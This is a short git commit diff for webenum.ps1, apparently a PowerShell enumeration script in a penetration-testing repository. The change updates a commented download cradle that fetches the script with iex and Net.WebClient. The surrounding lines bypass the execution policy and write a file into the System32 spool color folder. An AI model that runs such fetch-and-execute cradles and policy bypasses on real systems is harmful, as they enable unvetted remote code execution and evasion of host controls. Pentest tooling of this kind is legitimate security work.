7be66191b614c66c7557e909d7fd104a90855e90
h1dz <85143916+h1dz@users.noreply.github.com>
2021-09-19 23:03:42 +1000

    Update webenum.ps1

--- webenum.ps1
+++ webenum.ps1
@@ -1,6 +1,6 @@
 #Work in progress!!!
 #Download webenum.ps1
-#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/h1dz/Pen-Testing/blob/BashScripts/webenum.ps1')"
+#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/webenum.ps1')"
 Unblock-File -Path .\webenum.ps1
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
